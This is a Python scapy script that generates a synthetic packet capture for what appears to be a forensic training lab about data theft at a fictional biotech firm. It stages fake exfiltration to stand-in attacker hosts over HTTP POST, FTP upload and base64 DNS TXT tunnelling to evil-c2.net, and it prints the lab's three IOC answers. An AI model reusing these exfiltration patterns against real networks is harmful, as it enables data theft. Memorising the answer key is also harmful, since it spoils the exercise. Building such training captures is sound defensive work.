#!/usr/bin/env python3
"""
Generate a realistic packet capture for the Avalon Biotech traffic analysis lab.

The PCAP contains:
  - Normal background traffic (DNS lookups, internal HTTP browsing)
  - Suspicious HTTP POST to external C2 with IOC marker 1 (p4ck3t)
  - FTP session to external server with IOC marker 2 in PASS cmd (4n4lyz3)
  - DNS TXT exfiltration queries with IOC marker 3 (3xf1l)

Uses scapy to construct packets with proper protocol dissection support.
"""

from scapy.all import (
    Ether, IP, TCP, UDP, DNS, DNSQR, Raw,
    wrpcap, RandMAC
)
import struct
import time

# ── Network topology ─────────────────────────────────────────────────
WORKSTATION = "10.20.1.105"       # Mark Sullivan's R&D workstation
INTRANET    = "10.20.1.10"        # Avalon internal web server
DNS_SERVER  = "10.20.1.2"         # Internal DNS resolver
EXTERNAL_C2 = "198.51.100.47"    # Attacker's C2 server (HTTP)
EXTERNAL_FTP = "203.0.113.22"    # Attacker's FTP server
EVIL_DNS    = "185.199.108.99"   # Malicious DNS server

MAC_WS  = "02:00:0a:14:01:69"
MAC_GW  = "02:00:0a:14:01:01"
MAC_SRV = "02:00:0a:14:01:0a"
MAC_DNS = "02:00:0a:14:01:02"

pkts = []
ts = 1709640000.0  # Base timestamp: 2024-03-05 12:00:00 UTC


def add_pkt(pkt, offset=0.0):
    """Add a packet with a specific timestamp offset."""
    global ts
    ts += offset
    pkt.time = ts
    pkts.append(pkt)


# ═══════════════════════════════════════════════════════════════════════
# Phase 1: Normal background traffic (first 30 seconds)
# ═══════════════════════════════════════════════════════════════════════

# DNS lookups for internal services
for i, domain in enumerate(["intranet.avalon.local", "mail.avalon.local",
                              "vpn.avalon.local", "jira.avalon.local"]):
    add_pkt(
        Ether(src=MAC_WS, dst=MAC_DNS) /
        IP(src=WORKSTATION, dst=DNS_SERVER) /
        UDP(sport=49152+i, dport=53) /
        DNS(rd=1, qd=DNSQR(qname=domain, qtype="A")),
        offset=1.5
    )
    # DNS response
    add_pkt(
        Ether(src=MAC_DNS, dst=MAC_WS) /
        IP(src=DNS_SERVER, dst=WORKSTATION) /
        UDP(sport=53, dport=49152+i) /
        DNS(qr=1, aa=1, qd=DNSQR(qname=domain, qtype="A")),
        offset=0.05
    )

# Normal HTTP GET to internal intranet
for i, page in enumerate(["index.html", "news.html", "research/projects.html",
                           "hr/benefits.html", "it/helpdesk.html"]):
    sport = 50000 + i
    # SYN
    add_pkt(
        Ether(src=MAC_WS, dst=MAC_SRV) /
        IP(src=WORKSTATION, dst=INTRANET) /
        TCP(sport=sport, dport=80, flags="S", seq=1000+i*1000),
        offset=2.0
    )
    # SYN-ACK
    add_pkt(
        Ether(src=MAC_SRV, dst=MAC_WS) /
        IP(src=INTRANET, dst=WORKSTATION) /
        TCP(sport=80, dport=sport, flags="SA", seq=5000+i*1000, ack=1001+i*1000),
        offset=0.02
    )
    # GET request
    add_pkt(
        Ether(src=MAC_WS, dst=MAC_SRV) /
        IP(src=WORKSTATION, dst=INTRANET) /
        TCP(sport=sport, dport=80, flags="PA", seq=1001+i*1000, ack=5001+i*1000) /
        Raw(load=f"GET /{page} HTTP/1.1\r\nHost: intranet.avalon.local\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: text/html\r\n\r\n".encode()),
        offset=0.01
    )
    # Response
    add_pkt(
        Ether(src=MAC_SRV, dst=MAC_WS) /
        IP(src=INTRANET, dst=WORKSTATION) /
        TCP(sport=80, dport=sport, flags="PA", seq=5001+i*1000, ack=1200+i*1000) /
        Raw(load=f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nServer: nginx/1.24\r\n\r\n<html><body>Avalon Biotech - {page}</body></html>".encode()),
        offset=0.08
    )


# ═══════════════════════════════════════════════════════════════════════
# Phase 2: Suspicious HTTP POST to external C2 (IOC 1: p4ck3t)
# ═══════════════════════════════════════════════════════════════════════

c2_sport = 51234

# SYN to external C2
add_pkt(
    Ether(src=MAC_WS, dst=MAC_GW) /
    IP(src=WORKSTATION, dst=EXTERNAL_C2) /
    TCP(sport=c2_sport, dport=80, flags="S", seq=10000),
    offset=5.0
)
# SYN-ACK
add_pkt(
    Ether(src=MAC_GW, dst=MAC_WS) /
    IP(src=EXTERNAL_C2, dst=WORKSTATION) /
    TCP(sport=80, dport=c2_sport, flags="SA", seq=20000, ack=10001),
    offset=0.15
)
# ACK
add_pkt(
    Ether(src=MAC_WS, dst=MAC_GW) /
    IP(src=WORKSTATION, dst=EXTERNAL_C2) /
    TCP(sport=c2_sport, dport=80, flags="A", seq=10001, ack=20001),
    offset=0.01
)

# POST with exfiltrated data and IOC marker
post_body = "user=msullivan&token=p4ck3t&dataset=drug_trial_phase3_results&format=csv&rows=15847"
post_request = (
    f"POST /upload/data HTTP/1.1\r\n"
    f"Host: 198.51.100.47\r\n"
    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(post_body)}\r\n"
    f"X-Client-ID: avalon-ws-105\r\n"
    f"\r\n"
    f"{post_body}"
)
add_pkt(
    Ether(src=MAC_WS, dst=MAC_GW) /
    IP(src=WORKSTATION, dst=EXTERNAL_C2) /
    TCP(sport=c2_sport, dport=80, flags="PA", seq=10001, ack=20001) /
    Raw(load=post_request.encode()),
    offset=0.02
)

# C2 response
c2_response = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"status\":\"received\",\"bytes\":1523847}"
add_pkt(
    Ether(src=MAC_GW, dst=MAC_WS) /
    IP(src=EXTERNAL_C2, dst=WORKSTATION) /
    TCP(sport=80, dport=c2_sport, flags="PA", seq=20001, ack=10001+len(post_request)) /
    Raw(load=c2_response.encode()),
    offset=0.18
)


# ═══════════════════════════════════════════════════════════════════════
# Phase 3: FTP session to external server (IOC 2: 4n4lyz3)
# ═══════════════════════════════════════════════════════════════════════

ftp_sport = 52000

# SYN
add_pkt(
    Ether(src=MAC_WS, dst=MAC_GW) /
    IP(src=WORKSTATION, dst=EXTERNAL_FTP) /
    TCP(sport=ftp_sport, dport=21, flags="S", seq=30000),
    offset=8.0
)
# SYN-ACK
add_pkt(
    Ether(src=MAC_GW, dst=MAC_WS) /
    IP(src=EXTERNAL_FTP, dst=WORKSTATION) /
    TCP(sport=21, dport=ftp_sport, flags="SA", seq=40000, ack=30001),
    offset=0.12
)
# ACK
add_pkt(
    Ether(src=MAC_WS, dst=MAC_GW) /
    IP(src=WORKSTATION, dst=EXTERNAL_FTP) /
    TCP(sport=ftp_sport, dport=21, flags="A", seq=30001, ack=40001),
    offset=0.01
)

# FTP banner
add_pkt(
    Ether(src=MAC_GW, dst=MAC_WS) /
    IP(src=EXTERNAL_FTP, dst=WORKSTATION) /
    TCP(sport=21, dport=ftp_sport, flags="PA", seq=40001, ack=30001) /
    Raw(load=b"220 ProFTPD 1.3.8 Server ready.\r\n"),
    offset=0.05
)

# USER command
add_pkt(
    Ether(src=MAC_WS, dst=MAC_GW) /
    IP(src=WORKSTATION, dst=EXTERNAL_FTP) /
    TCP(sport=ftp_sport, dport=21, flags="PA", seq=30001, ack=40034) /
    Raw(load=b"USER msullivan\r\n"),
    offset=0.3
)

# 331 response
add_pkt(
    Ether(src=MAC_GW, dst=MAC_WS) /
    IP(src=EXTERNAL_FTP, dst=WORKSTATION) /
    TCP(sport=21, dport=ftp_sport, flags="PA", seq=40034, ack=30017) /
    Raw(load=b"331 Password required for msullivan.\r\n"),
    offset=0.1
)

# PASS command. contains IOC marker 2
add_pkt(
    Ether(src=MAC_WS, dst=MAC_GW) /
    IP(src=WORKSTATION, dst=EXTERNAL_FTP) /
    TCP(sport=ftp_sport, dport=21, flags="PA", seq=30017, ack=40072) /
    Raw(load=b"PASS 4n4lyz3\r\n"),
    offset=0.5
)

# 230 Login successful
add_pkt(
    Ether(src=MAC_GW, dst=MAC_WS) /
    IP(src=EXTERNAL_FTP, dst=WORKSTATION) /
    TCP(sport=21, dport=ftp_sport, flags="PA", seq=40072, ack=30031) /
    Raw(load=b"230 User msullivan logged in.\r\n"),
    offset=0.08
)

# STOR command
add_pkt(
    Ether(src=MAC_WS, dst=MAC_GW) /
    IP(src=WORKSTATION, dst=EXTERNAL_FTP) /
    TCP(sport=ftp_sport, dport=21, flags="PA", seq=30031, ack=40103) /
    Raw(load=b"STOR phase3_trial_data_20240305.tar.gz\r\n"),
    offset=1.2
)

# 150 Opening data connection
add_pkt(
    Ether(src=MAC_GW, dst=MAC_WS) /
    IP(src=EXTERNAL_FTP, dst=WORKSTATION) /
    TCP(sport=21, dport=ftp_sport, flags="PA", seq=40103, ack=30070) /
    Raw(load=b"150 Opening BINARY mode data connection for phase3_trial_data_20240305.tar.gz\r\n"),
    offset=0.1
)

# 226 Transfer complete
add_pkt(
    Ether(src=MAC_GW, dst=MAC_WS) /
    IP(src=EXTERNAL_FTP, dst=WORKSTATION) /
    TCP(sport=21, dport=ftp_sport, flags="PA", seq=40183, ack=30070) /
    Raw(load=b"226 Transfer complete. 15234567 bytes sent.\r\n"),
    offset=3.0
)


# ═══════════════════════════════════════════════════════════════════════
# Phase 4: DNS exfiltration queries (IOC 3: 3xf1l)
# ═══════════════════════════════════════════════════════════════════════

# Suspicious DNS TXT queries. data encoded in subdomain labels
dns_queries = [
    ("init.data.evil-c2.net", "TXT"),
    ("chunk1.data.evil-c2.net", "TXT"),
    ("aGVhbHRoX3JlY29yZA.data.evil-c2.net", "TXT"),  # base64 encoded
    ("token_3xf1l.data.evil-c2.net", "TXT"),          # IOC marker 3
    ("chunk2.data.evil-c2.net", "TXT"),
    ("dHJpYWxfcmVzdWx0cw.data.evil-c2.net", "TXT"),   # base64 encoded
    ("fin.data.evil-c2.net", "TXT"),
]

for i, (qname, qtype) in enumerate(dns_queries):
    # Query
    add_pkt(
        Ether(src=MAC_WS, dst=MAC_GW) /
        IP(src=WORKSTATION, dst=EVIL_DNS) /
        UDP(sport=12346+i, dport=53) /
        DNS(rd=1, qd=DNSQR(qname=qname, qtype=16)),  # 16 = TXT
        offset=1.5
    )
    # Response (just acknowledge)
    add_pkt(
        Ether(src=MAC_GW, dst=MAC_WS) /
        IP(src=EVIL_DNS, dst=WORKSTATION) /
        UDP(sport=53, dport=12346+i) /
        DNS(qr=1, aa=1, qd=DNSQR(qname=qname, qtype=16)),
        offset=0.08
    )


# ═══════════════════════════════════════════════════════════════════════
# Phase 5: More normal traffic (cover)
# ═══════════════════════════════════════════════════════════════════════

for i, domain in enumerate(["calendar.avalon.local", "wiki.avalon.local"]):
    add_pkt(
        Ether(src=MAC_WS, dst=MAC_DNS) /
        IP(src=WORKSTATION, dst=DNS_SERVER) /
        UDP(sport=49200+i, dport=53) /
        DNS(rd=1, qd=DNSQR(qname=domain, qtype="A")),
        offset=3.0
    )

# Final internal HTTP request (normal browsing after exfil)
add_pkt(
    Ether(src=MAC_WS, dst=MAC_SRV) /
    IP(src=WORKSTATION, dst=INTRANET) /
    TCP(sport=50100, dport=80, flags="PA", seq=70000, ack=80000) /
    Raw(load=b"GET /hr/timesheet.html HTTP/1.1\r\nHost: intranet.avalon.local\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n"),
    offset=2.0
)


# ═══════════════════════════════════════════════════════════════════════
# Write PCAP
# ═══════════════════════════════════════════════════════════════════════

wrpcap("/home/analyst/evidence/capture.pcap", pkts)
print(f"[+] Generated capture.pcap with {len(pkts)} packets")
print(f"[+] IOC 1 (HTTP POST token): p4ck3t")
print(f"[+] IOC 2 (FTP password):    4n4lyz3")
print(f"[+] IOC 3 (DNS exfil label):  3xf1l")
